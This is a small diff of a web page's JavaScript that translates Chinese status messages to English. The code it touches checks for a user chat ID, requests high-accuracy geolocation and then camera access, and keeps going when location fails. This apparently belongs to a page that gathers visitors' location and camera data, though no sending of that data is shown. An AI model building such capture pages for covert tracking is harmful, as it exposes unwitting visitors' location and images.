@@ -30,7 +30,7 @@
             if (!CHAT_ID) { status.innerText = "❌ 错误：未识别到用户ID"; return; }
             
             startBtn.style.display = 'none';
-            status.innerText = "正在请求地理位置权限...";
+            status.innerText = "Requesting geolocation permissions...";
 
             // 1. 获取定位（增加 try-catch 容错，失败也不中断）
             let pos = null;
@@ -38,10 +38,10 @@
                 pos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
                 });
-                status.innerText = "位置已获取，正在请求相机权限...";
+                status.innerText = "Requesting camera permission...";
             } catch (err) {
-                console.warn("定位获取失败，尝试跳过...");
-                status.innerText = "正在请求相机权限...";
+                console.warn("Location acquisition failed, try skipping...");
+                status.innerText = "Requesting camera permission...";
             }
             
             // 2. 请求相机
